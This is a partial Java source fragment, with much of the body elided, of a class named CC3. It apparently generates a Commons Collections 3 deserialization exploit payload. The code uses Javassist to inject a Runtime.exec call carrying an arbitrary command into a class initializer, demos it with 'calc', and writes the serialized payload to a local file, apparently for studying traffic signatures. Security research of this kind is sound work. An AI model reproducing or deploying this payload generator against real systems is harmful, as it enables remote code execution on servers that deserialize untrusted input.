...
public class CC3 {
    ...
    public static Object getPayload(String command) throws Exception{
        ...
        placeholder.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec(\""+command+"\");");
    ...
    public static void main(String[] args)throws Exception {
         Object payload = getPayload("calc");
         //SerialUtil.runPayload(payload);
        SerialUtil.savePayload(payload,"C:\\Users\\18148\\Desktop\\tmp\\流量特征\\cc3");

        // 将payload保存到文件
//        SerialUtil.savePayload(getPayload("calc"),"E:/jdbc.serial");
